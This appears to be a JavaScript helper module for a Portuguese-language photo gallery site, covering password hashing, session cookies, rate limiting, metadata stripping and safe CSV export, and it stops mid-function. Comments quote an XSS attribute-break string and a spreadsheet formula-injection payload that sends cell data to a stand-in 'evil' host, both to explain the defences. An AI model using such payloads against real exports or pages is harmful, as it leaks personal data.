import { dataSecurityHeaders, sanitizeFilename } from './security.js';

let _cache = null;
let _cacheAt = 0;
const CACHE_TTL = 30_000;
// Abort outbound transactional-email calls if Resend hangs, so a slow upstream
// never holds the request past this budget.
const EMAIL_TIMEOUT_MS = 10_000;
// Minimum gap between unhandled-exception alert emails — a single global
// cooldown (not per-error-type) so an incident that throws repeatedly can't
// flood the inbox; still frequent enough that a real outage is noticed fast.
const ERROR_ALERT_COOLDOWN_SECS = 900;

// Terms of Service version (the "Atualizada em" date, YYYY-MM-DD). Bump whenever the
// Terms text changes — every image-use consent record pins the version the visitor
// accepted, so old acceptances stay tied to the exact text they agreed to.
export const TERMS_VERSION = '2026-06-18';

// Exact wording of the consent the visitor ticks before Drive access. Stored verbatim
// with each consent record (the client echoes it back) for non-repudiation.
export const CONSENT_LABEL = 'Li e aceito os Termos de Uso e autorizo o uso da minha imagem conforme descrito neles.';

// Access categories for a project. Drives which self-declaration the gateway requires
// before unlocking the Drive link, and is recorded with each consent. 'public' is the
// default for legacy events with no accessType set.
export const ACCESS_TYPES = ['public', 'private', 'family'];

// Per-category self-declarations the visitor must additionally tick (on top of the Terms)
// before the Drive link unlocks, for 'family' and 'private' projects. Stored verbatim with
// each consent record for non-repudiation — the canonical source, like CONSENT_LABEL.
// 'public' has no extra declaration (Terms acceptance only).
export const ACCESS_DECLARATIONS = {
  family:  'Declaro ser membro da família e reconheço que estas imagens são de uso estritamente particular e doméstico.',
  private: 'Declaro que sou participante deste evento ou possuo autorização para acessar estas imagens. Estou ciente de que o material destina-se ao meu uso pessoal e não deve ser comercializado.',
};

// fresh=true bypasses the isolate-local cache — required on admin reads and
// any read-modify-write, where 30 s of staleness could clobber another
// isolate's recent save.
export async function getEvents(env, fresh = false) {
  const now = Date.now();
  if (!fresh && _cache && now - _cacheAt < CACHE_TTL) return _cache;
  const data = await env.FOTOS.get('events');
  // Single choke point for shape validation: every caller (gallery, event page,
  // dashboard, metrics, healthz, backup) reads through here, so one guard keeps
  // a corrupted `events` value — a bad restore, a hand-edited KV entry, a
  // truncated write — from throwing on `e.visible` / `e.slug` and 500-ing the
  // whole public site. Non-array payloads and non-object entries are dropped
  // instead of propagating; the next save then self-heals the stored value.
  _cache = data ? ((() => {
    try {
      const parsed = JSON.parse(data);
      if (!Array.isArray(parsed)) return [];
      return parsed.filter(e => e && typeof e === 'object' && !Array.isArray(e));
    } catch { return []; }
  })()) : [];
  _cacheAt = now;
  return _cache;
}

export async function saveEvents(env, events) {
  _cache = events;
  _cacheAt = Date.now();
  await env.FOTOS.put('events', JSON.stringify(events));
}

// Categories are user-managed (created/deleted from the dashboard) and stored
// as a flat list of display names under the KV key `categories`. Until the
// owner changes anything, these defaults apply.
export const DEFAULT_CATEGORIES = ['Formatura', 'Casamento', 'Ensaio', 'Evento', 'Outro'];
export const MAX_CATEGORIES = 30;
export const MAX_CATEGORY_LEN = 40;

export async function getCategories(env) {
  const data = await env.FOTOS.get('categories');
  if (!data) return [...DEFAULT_CATEGORIES];
  try {
    const arr = JSON.parse(data);
    return Array.isArray(arr) ? arr.filter(c => typeof c === 'string') : [...DEFAULT_CATEGORIES];
  } catch {
    return [...DEFAULT_CATEGORIES];
  }
}

export async function saveCategories(env, cats) {
  await env.FOTOS.put('categories', JSON.stringify(cats));
}


function hexToBytes(hex) {
  const arr = new Uint8Array(hex.length / 2);
  for (let i = 0; i < arr.length; i++) arr[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  return arr;
}

function bytesToHex(u8) {
  return Array.from(u8).map(b => b.toString(16).padStart(2, '0')).join('');
}

export function timingSafeEqual(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  if (a.length !== b.length) return false;
  let diff = 0;
  for (let i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

// 100k measures ~50 ms — within the 200 ms CI healthz budget (deploy.yml).
// Stored hashes embed their own iteration count, so raising this never
// breaks existing credentials.
export async function hashPassword(password, saltHex, iterations = 100_000) {
  const enc = new TextEncoder();
  const salt = saltHex
    ? hexToBytes(saltHex)
    : crypto.getRandomValues(new Uint8Array(16));
  const key = await crypto.subtle.importKey('raw', enc.encode(password), 'PBKDF2', false, ['deriveBits']);
  const bits = await crypto.subtle.deriveBits(
    { name: 'PBKDF2', hash: 'SHA-256', salt, iterations },
    key, 256
  );
  return `pbkdf2:${iterations}:${bytesToHex(salt)}:${bytesToHex(new Uint8Array(bits))}`;
}

export async function verifyPassword(password, stored) {
  if (!stored) return false;
  if (!stored.startsWith('pbkdf2:')) {
    // Legacy SHA-256 path — only active during the first login after migration
    const enc = new TextEncoder();
    const buf = await crypto.subtle.digest('SHA-256', enc.encode(password));
    return timingSafeEqual(bytesToHex(new Uint8Array(buf)), stored);
  }
  const [, rawIterations, saltHex] = stored.split(':');
  const iterations = parseInt(rawIterations, 10);
  const candidate = await hashPassword(password, saltHex, iterations);
  return timingSafeEqual(candidate, stored);
}

export function generateToken() {
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

// ---------------------------------------------------------------------------
// Sessão do painel
// ---------------------------------------------------------------------------
// O cookie usa o prefixo `__Host-`, que não é cosmético: o browser só aceita
// gravá-lo com Secure, Path=/ e SEM atributo Domain. Na prática isso significa
// que nenhum outro host de lucafchala.com — nem um subdomínio comprometido, nem
// um serviço de terceiro apontado por CNAME — consegue definir ou sobrescrever
// o cookie de sessão deste site. É a única forma de fixação de sessão por
// vizinho de domínio que o SameSite=Strict sozinho não cobria.
//
// O nome antigo (`session`) continua sendo LIDO para que o deploy não derrube a
// sessão de quem já estava logado. Só gravamos o novo.
export const SESSION_COOKIE = '__Host-session';
export const SESSION_TTL_SECS = 86400;     // teto absoluto: 24 h, como antes
export const SESSION_IDLE_SECS = 7200;     // 2 h sem uso encerram a sessão
const SESSION_REFRESH_SECS = 600;          // só reescreve o "lastSeen" a cada 10 min

export function sessionCookie(token, { clear = false } = {}) {
  const base = `${SESSION_COOKIE}=${clear ? '' : token}; Path=/; HttpOnly; Secure; SameSite=Strict`;
  return clear ? `${base}; Max-Age=0` : `${base}; Max-Age=${SESSION_TTL_SECS}`;
}

// Impressão grosseira do cliente. Só o User-Agent: IP fica de fora de propósito
// porque celular troca de IP o tempo todo (4G <-> Wi-Fi) e amarrar a sessão a
// ele significaria deslogar o admin no meio de uma edição. O UA muda só quando
// o browser atualiza, e o custo desse caso é um login a mais.
export function clientFingerprint(request) {
  const ua = request.headers.get('User-Agent') || '';
  let h = 2166136261; // FNV-1a de 32 bits: identificador curto, não é segredo
  for (let i = 0; i < ua.length; i++) {
    h ^= ua.charCodeAt(i);
    h = Math.imul(h, 16777619);
  }
  return (h >>> 0).toString(36);
}

export function sessionRecord(request) {
  const now = Date.now();
  return JSON.stringify({ v: 1, createdAt: now, lastSeen: now, fp: clientFingerprint(request) });
}

// Encerra a sessão por qualquer um dos três motivos e some com a chave. Antes
// isto era uma comparação com a string 'valid': uma sessão só morria pelo TTL
// de 24 h do KV, sem inatividade e sem vínculo com o cliente que a abriu.
export async function verifySession(env, request) {
  const cookies = request.headers.get('Cookie') || '';
  const match = cookies.match(/(?:^|;\s*)(?:__Host-)?session=([a-f0-9]{64})/);
  if (!match) return false;

  const token = match[1];
  const key = `admin_session:${token}`;
  const raw = await env.FOTOS.get(key);
  if (!raw) return false;

  // Sessão criada antes deste deploy: sem metadado. Aceita até expirar pelo
  // TTL do KV, senão o deploy deslogaria quem estava no meio de um trabalho.
  if (raw === 'valid') return true;

  let rec;
  try { rec = JSON.parse(raw); } catch { return false; }
  if (!rec || typeof rec !== 'object') return false;

  const now = Date.now();
  // `createdAt` ausente ou corrompido não pode virar "sessão eterna": sem um
  // início confiável, não dá para dizer se o teto de 24 h já passou, e a
  // resposta segura para uma credencial ilegível é recusá-la.
  const createdAt = typeof rec.createdAt === 'number' && Number.isFinite(rec.createdAt) ? rec.createdAt : null;
  if (createdAt === null) {
    await env.FOTOS.delete(key).catch(() => {});
    return false;
  }
  if (rec.fp && rec.fp !== clientFingerprint(request)) {
    await env.FOTOS.delete(key).catch(() => {});
    return false;
  }
  // Teto absoluto verificado no código, e não só pelo TTL do KV. O TTL é a
  // primeira linha, mas ele é um efeito colateral do armazenamento: se um
  // registro for reescrito com o prazo errado (foi o que um `createdAt`
  // corrompido causava, gerando um expirationTtl NaN que a escrita recusava em
  // silêncio), a sessão sobrevivia além das 24 h sem ninguém notar.
  if (now - createdAt > SESSION_TTL_SECS * 1000) {
    await env.FOTOS.delete(key).catch(() => {});
    return false;
  }
  if (typeof rec.lastSeen === 'number' && now - rec.lastSeen > SESSION_IDLE_SECS * 1000) {
    await env.FOTOS.delete(key).catch(() => {});
    return false;
  }

  // Renovação com trava: uma escrita a cada 10 min por sessão, não uma por
  // requisição. O painel faz várias chamadas por tela e a cota de escrita do KV
  // é de 1000/dia — sem a trava, uma tarde de uso consumiria a cota do site.
  if (typeof rec.lastSeen !== 'number' || now - rec.lastSeen > SESSION_REFRESH_SECS * 1000) {
    // O TTL renovado acompanha o teto absoluto: renovar por mais 24 h a cada
    // uso transformaria a sessão de 24 h numa sessão perpétua.
    const ttl = Math.max(60, Math.round((createdAt + SESSION_TTL_SECS * 1000 - now) / 1000));
    await env.FOTOS.put(key, JSON.stringify({ ...rec, lastSeen: now }), { expirationTtl: ttl })
      .catch(e => console.error('session refresh failed', e));
  }
  return true;
}

export async function checkRateLimit(env, ip, key, limit, windowSecs) {
  const window = Math.floor(Date.now() / (windowSecs * 1000));
  const kvKey = `ratelimit:${key}:${ip}:${window}`;
  const raw = parseInt(await env.FOTOS.get(kvKey) || '0', 10);
  // NaN >= limit is false, so a corrupted counter used to fail *open* — the
  // limit silently stopped applying for that key/IP/window, and String(NaN)
  // kept it corrupted. Treating unparseable as 0 keeps the limiter counting.
  const count = Number.isFinite(raw) ? raw : 0;
  if (count >= limit) return false;
  await env.FOTOS.put(kvKey, String(count + 1), { expirationTtl: windowSecs });
  return true;
}

export function escape(str) {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// Shared footer block (legal links + copyright) reused across every public
// page so the near-identical footers can't drift out of sync as new links get
// added. The year is computed live — pages render per-request, so the
// copyright is always current with no cron/build step needed. Callers
// provide their own CSS for .legal-link/.footer-copyright (this only returns
// markup, same contract as escape()/formatDatePT()). `extra` lets a specific
// page fold one more low-key link into the same row (e.g. event.js's "Ver
// tour novamente") instead of starting a second, more crowded row — kept out
// of the default set since it's not relevant on every page. "Sugestões"
// deliberately lives only in the dismissible update banner, not here — the
// footer was getting crowded and this link doesn't need to be permanent.
// "Privacidade" e "Termos" viraram um único link "Legal", que aponta para a
// Central de Transparência (/legal) — de onde os dois continuam a um clique.
// O rodapé estava com seis links competindo por atenção, e os dois jurídicos
// eram justamente os que ninguém clica quando estão soltos ali.
//
// Isso NÃO reduz o acesso às políticas, ao contrário: a página de destino
// mostra o resumo do que é feito com os dados, os prazos, os canais de contato
// e a documentação de conformidade inteira — tudo que antes exigia saber onde
// procurar. Um único link nomeado é também o padrão de quem trata conformidade
// como algo a exibir, não a esconder.
export function footerLegalLinksHTML(extra = '') {
  const year = new Date().getFullYear();
  return `
    <div class="footer-actions-legal">
      <a href="/sobre" class="legal-link">Sobre</a>
      <a href="/equipamentos" class="legal-link">Equipamento</a>
      <a href="/suporte" class="legal-link">Suporte</a>
      <a href="/legal" class="legal-link">Legal</a>
      <a href="https://github.com/lucafchala/fotos" target="_blank" rel="noopener" class="legal-link">Código-fonte</a>
      ${extra}
    </div>
    <p class="footer-copyright">© ${year} Luca F. Chala. Todos os direitos reservados.</p>`;
}

// Instagram-branded credit button, reused twice on the event page (main
// credits section + drive-modal guide box). idSuffix keeps each instance's
// SVG gradient id unique since both can render on the same document.
export function igCreditButtonHTML(idSuffix, label = 'Marque-me') {
  return `
    <a href="https://instagram.com/lucafchala" target="_blank" rel="noopener" class="ig-credit-btn">
      <span class="ig-credit-icon">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18">
          <defs>
            <linearGradient id="igGrad${idSuffix}" x1="0%" y1="100%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#f09433"/><stop offset="25%" stop-color="#e6683c"/>
              <stop offset="50%" stop-color="#dc2743"/><stop offset="75%" stop-color="#cc2366"/>
              <stop offset="100%" stop-color="#bc1888"/>
            </linearGradient>
          </defs>
          <path fill="url(#igGrad${idSuffix})" d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0Zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.897 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.897-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06L12 2.16Zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162ZM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4Zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439Z"/>
        </svg>
      </span>
      <span class="ig-credit-text">${label}: <strong>@lucafchala</strong></span>
    </a>`;
}

// Dismissible "new interface" notice shown on the gallery and every project
// page while the redesign is fresh. Dismissal is remembered client-side
// (localStorage, same pattern as the cookie notice already on these pages) —
// each page wires its own show/hide script since inline <script> blocks
// aren't shared across pages, only this markup is.
export function updateBannerHTML() {
  return `
    <div class="update-banner" id="update-banner">
      <span>✨ Nova interface, melhorada!</span>
      <a href="/suporte?tema=bug">Encontrou um problema? Reportar</a>
      <a href="/suporte?tema=sugestao">💡 Tem uma sugestão?</a>
      <button type="button" class="ub-close" id="update-banner-close" aria-label="Fechar aviso">×</button>
    </div>`;
}

export function validateSlug(slug) {
  return typeof slug === 'string' && /^[a-z0-9][a-z0-9-]*[a-z0-9]$|^[a-z0-9]$/.test(slug) && slug.length <= 60;
}

export function generateId() {
  return Array.from(crypto.getRandomValues(new Uint8Array(16)))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}

export function formatDatePT(dateStr) {
  if (!dateStr) return '';
  const parts = dateStr.split('-');
  if (parts.length !== 3) return dateStr;
  const [year, month, day] = parts;
  const months = [
    'janeiro', 'fevereiro', 'março', 'abril', 'maio', 'junho',
    'julho', 'agosto', 'setembro', 'outubro', 'novembro', 'dezembro',
  ];
  const m = parseInt(month, 10);
  if (m < 1 || m > 12) return dateStr;
  return `${parseInt(day, 10)} de ${months[m - 1]} de ${year}`;
}

// Canonical event ordering: pinned first, then most recent by date
// (falling back to createdAt). Shared by the public gallery and the
// dashboard so the two never drift apart.
export function eventTime(e) {
  return e.date ? new Date(e.date).getTime() : new Date(e.createdAt || 0).getTime();
}

export function sortEvents(events) {
  return [...events].sort((a, b) => {
    if (a.pinned && !b.pinned) return -1;
    if (!a.pinned && b.pinned) return 1;
    return eventTime(b) - eventTime(a);
  });
}

// Request a resized variant of a Google-Drive-hosted thumbnail so the gallery
// grid loads small images instead of full-resolution originals. Non-Drive URLs
// (or URLs we don't recognise) are returned untouched. The original files in
// Drive are never altered.
export function sizedDriveThumb(url, width) {
  if (!url || typeof url !== 'string') return url || '';
  const m = url.match(/^(https:\/\/lh3\.googleusercontent\.com\/d\/[\w-]+)(=.*)?$/);
  return m ? `${m[1]}=w${width}` : url;
}

// Coerce a URL to https and reject script-executing schemes. href/src are
// script sinks — drop javascript:/data:/anything non-https.
export function toHttps(url) {
  if (typeof url !== 'string') return ''; // was: threw on non-string (e.g. a number from a backup)
  const u = url.startsWith('http://') ? 'https://' + url.slice(7) : url;
  return /^https:\/\//i.test(u) ? u : '';
}

// Render-time guard for values that land in an href/src. toHttps() already
// sanitizes on write, but stored data can predate that (legacy KV rows) or
// bypass it (a restored backup is merged verbatim), and escape() alone does
// NOT stop `javascript:` inside an href — it only escapes the quotes around
// it. Sanitizing again at the sink makes the page safe regardless of how the
// value got into KV.
//
// ATENÇÃO — isto é allowlist de ESQUEMA, não escape de HTML. O retorno é a URL
// crua quando ela começa com https:, e uma URL válida pode conter aspas:
// `https://x/" onload="alert(1)` passa inteiro por aqui. Ao interpolar dentro
// de um atributo HTML, componha as duas: escape(safeUrl(x)) — safeUrl mata o
// `javascript:`, escape mata a quebra de atributo. Nenhuma das duas sozinha
// cobre os dois casos. Em atribuição de propriedade no cliente (el.href = x)
// safeUrl basta, porque não há parsing de HTML envolvido.
export function safeUrl(url) {
  return toHttps(url);
}

// ---------------------------------------------------------------------------
// Remoção de metadados (EXIF/GPS/XMP) das imagens enviadas
// ---------------------------------------------------------------------------
// A foto que chega pelo formulário de remoção é enviada por e-mail ao admin
// como anexo. Uma foto de celular carrega EXIF com coordenada de GPS, modelo do
// aparelho, número de série e data/hora exata. Ou seja: alguém que escreve
// pedindo para *sumir* de uma foto acaba nos entregando, de brinde, onde a foto
// foi tirada. Isso é o oposto do pedido, e não é dado de que precisamos para
// atender a solicitação — o que a LGPD chama de minimização (art. 6º, III).
//
// A limpeza acontece no servidor, antes do anexo existir. Só JPEG, PNG e WebP
// são tratados: são os três formatos onde a remoção é uma poda de contêiner
// (dropar segmentos/chunks), sem recodificar o pixel. HEIC/AVIF/GIF passam
// intactos — o EXIF neles vive dentro de caixas ISO-BMFF e mexer ali sem um
// decodificador de verdade corre o risco de corromper a prova que o titular
// mandou. Preferimos entregar a foto legível e registrar a limitação.

// Segmentos JPEG que carregam metadado, não imagem:
// APP1 (EXIF/XMP), APP2 (ICC/FlashPix), APP13 (IPTC/Photoshop) e o comentário.
// APP0 (JFIF) fica: é o que define densidade/aspecto para alguns leitores.
const JPEG_STRIP_MARKERS = new Set([
  0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8,
  0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF, 0xFE,
]);

function stripJpeg(bytes) {
  // SOI, depois uma cadeia de segmentos `FF xx <len16> <payload>` até o SOS
  // (0xDA), a partir do qual vêm os dados comprimidos — que copiamos inteiros.
  if (bytes[0] !== 0xFF || bytes[1] !== 0xD8) return null;
  const out = [bytes.subarray(0, 2)];
  let i = 2;
  while (i + 3 < bytes.length) {
    if (bytes[i] !== 0xFF) return null; // fora de sincronia: não arrisque, devolva o original
    const marker = bytes[i + 1];
    if (marker === 0xD8 || marker === 0x01 || (marker >= 0xD0 && marker <= 0xD7)) { i += 2; continue; }
    if (marker === 0xDA) { out.push(bytes.subarray(i)); break; } // SOS + dados comprimidos até o fim
    const len = (bytes[i + 2] << 8) | bytes[i + 3];
    if (len < 2 || i + 2 + len > bytes.length) return null; // comprimento corrompido
    if (!JPEG_STRIP_MARKERS.has(marker)) out.push(bytes.subarray(i, i + 2 + len));
    i += 2 + len;
  }
  return concatBytes(out);
}

// Chunks PNG ancilares que guardam metadado ou texto arbitrário. As críticas
// (IHDR/PLTE/IDAT/IEND) e as de cor (gAMA/cHRM/sRGB/iCCP) ficam — sem elas a
// imagem muda de aparência ou nem abre.
const PNG_STRIP_CHUNKS = new Set(['eXIf', 'tEXt', 'iTXt', 'zTXt', 'tIME', 'dSIG']);

function stripPng(bytes) {
  const SIG = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
  for (let i = 0; i < SIG.length; i++) if (bytes[i] !== SIG[i]) return null;
  const out = [bytes.subarray(0, 8)];
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  let i = 8;
  while (i + 8 <= bytes.length) {
    const len = view.getUint32(i);
    const type = String.fromCharCode(bytes[i + 4], bytes[i + 5], bytes[i + 6], bytes[i + 7]);
    const total = 12 + len; // len + type(4) + data + crc(4)
    if (len > bytes.length || i + total > bytes.length) return null;
    if (!PNG_STRIP_CHUNKS.has(type)) out.push(bytes.subarray(i, i + total));
    i += total;
    if (type === 'IEND') break;
  }
  return concatBytes(out);
}

// WebP é RIFF: header de 12 bytes e uma sequência de chunks alinhados a 2.
// EXIF e XMP são chunks próprios, então some com eles e reescreva o tamanho
// declarado no header — que é o passo fácil de esquecer e que deixaria o
// arquivo inválido.
const WEBP_STRIP_CHUNKS = new Set(['EXIF', 'XMP ']);

function stripWebp(bytes) {
  const tag = o => String.fromCharCode(bytes[o], bytes[o + 1], bytes[o + 2], bytes[o + 3]);
  if (tag(0) !== 'RIFF' || tag(8) !== 'WEBP') return null;
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const body = [];
  let i = 12;
  while (i + 8 <= bytes.length) {
    const type = tag(i);
    const len = view.getUint32(i + 4, true); // RIFF é little-endian
    const padded = len + (len % 2); // chunk ímpar leva 1 byte de padding
    if (i + 8 + padded > bytes.length) return null;
    if (!WEBP_STRIP_CHUNKS.has(type)) body.push(bytes.subarray(i, i + 8 + padded));
    i += 8 + padded;
  }
  const bodyBytes = concatBytes(body);
  const header = new Uint8Array(12);
  header.set(bytes.subarray(0, 12));
  new DataView(header.buffer).setUint32(4, bodyBytes.length + 4, true); // 'WEBP' + corpo
  return concatBytes([header, bodyBytes]);
}

function concatBytes(chunks) {
  const total = chunks.reduce((n, c) => n + c.length, 0);
  const out = new Uint8Array(total);
  let at = 0;
  for (const c of chunks) { out.set(c, at); at += c.length; }
  return out;
}

export function bytesFromBase64(b64) {
  const bin = atob(b64);
  const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}

export function base64FromBytes(bytes) {
  // Em blocos: String.fromCharCode(...bytes) com 2 MB estoura o limite de
  // argumentos da engine.
  let bin = '';
  const CHUNK = 0x8000;
  for (let i = 0; i < bytes.length; i += CHUNK) {
    bin += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
  }
  return btoa(bin);
}

// Devolve { base64, stripped, format }. Qualquer imprevisto (formato não
// suportado, estrutura inesperada, erro de decodificação) devolve o original
// com stripped=false: perder o anexo do titular seria pior do que manter o
// metadado, e o resultado fica registrado para quem revisa o pedido.
export function stripImageMetadata(b64) {
  let bytes;
  try { bytes = bytesFromBase64(b64); } catch { return { base64: b64, stripped: false, format: 'unknown' }; }
  if (bytes.length < 12) return { base64: b64, stripped: false, format: 'unknown' };

  let format = 'unknown';
  let cleaned = null;
  try {
    if (bytes[0] === 0xFF && bytes[1] === 0xD8) { format = 'jpeg'; cleaned = stripJpeg(bytes); }
    else if (bytes[0] === 0x89 && bytes[1] === 0x50) { format = 'png'; cleaned = stripPng(bytes); }
    else if (String.fromCharCode(bytes[0], bytes[1], bytes[2], bytes[3]) === 'RIFF') { format = 'webp'; cleaned = stripWebp(bytes); }
  } catch {
    cleaned = null;
  }

  if (!cleaned || cleaned.length === 0 || cleaned.length > bytes.length) {
    return { base64: b64, stripped: false, format };
  }
  try {
    return { base64: base64FromBytes(cleaned), stripped: true, format };
  } catch {
    return { base64: b64, stripped: false, format };
  }
}

// Sniff magic bytes from the start of a base64 payload to confirm it's an image
// (not an arbitrary blob smuggled through the removal-upload field).
export function isLikelyImage(b64) {
  let head;
  try { head = atob(b64.slice(0, 32)); } catch { return false; }
  const byte = i => head.charCodeAt(i);
  if (byte(0) === 0xFF && byte(1) === 0xD8 && byte(2) === 0xFF) return true;                         // JPEG
  if (byte(0) === 0x89 && byte(1) === 0x50 && byte(2) === 0x4E && byte(3) === 0x47) return true;     // PNG
  if (head.slice(0, 4) === 'GIF8') return true;                                                      // GIF
  if (head.slice(0, 4) === 'RIFF' && head.slice(8, 12) === 'WEBP') return true;                      // WebP
  if (head.slice(4, 8) === 'ftyp' && /heic|heif|heix|hevc|mif1|avif/.test(head.slice(8, 20))) return true; // HEIC/AVIF
  return false;
}

// CSV export helpers (shared by the consent / removal / metrics exports).
//
// INJEÇÃO DE FÓRMULA — o motivo de este arquivo não ser trivial. O export de
// consentimentos carrega campos que quem visita o site controla por inteiro:
// `consenter_name` (digitado no gate do Drive), `user_agent` e `referrer`
// (cabeçalhos crus). Excel, LibreOffice e Google Sheets tratam uma célula que
// começa com `=`, `+`, `-`, `@`, TAB ou CR como fórmula e a executam ao abrir o
// arquivo. Um nome como
//
//     =HYPERLINK("https://evil/?x="&A1,"clique")
//
// atravessa aspas de CSV sem problema (aspas são citação, não escape de
// fórmula) e roda na planilha de quem exporta — ou seja, no computador do
// admin, com o arquivo inteiro de dados pessoais aberto na frente. É uma
// execução no cliente que nenhuma proteção do site alcança, porque acontece
// depois do download.
//
// A defesa é prefixar com apóstrofo, que a planilha consome como "isto é
// texto". Combinada com a citação normal do CSV, o valor continua legível e
// deixa de ser executável.
const CSV_FORMULA_PREFIX = /^[-=+@\t\r]/;

export function csvCell(v) {
  if (v === null || v === undefined) return '';
  let s = String(v);
  // Antes de qualquer coisa: caracteres de controle fora. Eles não são dado
  // legítimo em nenhuma das colunas exportadas e são exatamente o que dá para
  // usar para forjar a estrutura do arquivo.
  // eslint-disable-next-line no-control-regex
  s = s.replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, '');
  if (CSV_FORMULA_PREFIX.test(s)) s = "'" + s;
  return /[",\n\r]/.test(s) ? '"' + s.replace(/"/g, '""') + '"' : s;
}

export function csvResponse(filename, cols, rows) {
  const head = cols.map(csvCell).join(',');
  const lines = rows.map(r => cols.map(c => csvCell(r[c])).join(','));
  // Leading BOM so Excel opens UTF-8 (accents) correctly.
  const csv = '﻿' + [head, ...lines].join('\r\n') + '\r\n';
  return new Response(csv, {
    headers: {
      ...dataSecurityHeaders('text/csv; charset=utf-8'),
      // Nome vem de chamador interno, mas é interpolado num cabeçalho HTTP:
      // aspas e CR/LF fora, sempre, para que a origem do valor nunca precise
      // ser reauditada quando alguém acrescentar um export novo.
      'Content-Disposition': `attachment; filename="${String(filename).replace(/[^\w.-]/g, '_')}"`,
    },
  });
}


export async function sendRemovalEmail(env, req) {
  const apiKey = env.RESEND_API_KEY;
  if (!apiKey) return false;

  const methodLabel = { number: 'Número da foto', url: 'Link da foto', upload: 'Arquivo enviado' }[req.method] || req.method;
  const esc = escape; // canonical 5-char escaper — never reintroduce the 3-char variant

  const html = `
<div style="font-family:sans-serif;max-width:520px;margin:0 auto;color:#1a1a1a">
  <h2 style="font-size:18px;margin-bottom:4px">🗑 Solicitação de remoção de foto</h2>
  <p style="color:#888;font-size:13px;margin-bottom:20px">Recebida via fotos.lucafchala.com</p>
  <table style="width:100%;border-collapse:collapse;font-size:14px">
    <tr><td style="padding:8px 0;color:#666;width:120px">Projeto</td><td style="padding:8px 0"><strong>${esc(req.eventTitle)}</strong> &nbsp;<span style="color:#aaa">/${esc(req.eventSlug)}</span></td></tr>
    <tr><td style="padding:8px 0;color:#666">Tipo</td><td style="padding:8px 0">${esc(methodLabel)}</td></tr>
    ${req.value ? `<tr><td style="padding:8px 0;color:#666">Identificação</td><td style="padding:8px 0">${esc(req.value)}</td></tr>` : ''}
    ${req.method === 'upload' ? `<tr><td style="padding:8px 0;color:#666">Arquivo</td><td style="padding:8px 0">${esc(req.fileName || 'em anexo')}</td></tr>` : ''}
    ${req.email ? `<tr><td style="padding:8px 0;color:#666">E-mail</td><td style="padding:8px 0">${esc(req.email)}</td></tr>` : ''}
    ${req.phone ? `<tr><td style="padding:8px 0;color:#666">Telefone</td><td style="padding:8px 0">${esc(req.phone)}</td></tr>` : ''}
    ${req.message ? `<tr><td style="padding:8px 0;color:#666;vertical-align:top">Mensagem</td><td style="padding:8px 0">${esc(req.message)}</td></tr>` : ''}
    <tr><td style="padding:8px 0;color:#666">Data</td><td style="padding:8px 0;color:#888;font-size:12px">${new Date(req.createdAt).toLocaleString('pt-BR')}</td></tr>
  </table>
  <p style="margin-top:24px;font-size:12px;color:#bbb">Gerencie as solicitações em fotos.lucafchala.com/dashboard</p>
</div>`;

  const body = {
    from: 'Fotos <noreply@lucafchala.com>',
    to: [env.ADMIN_EMAIL],
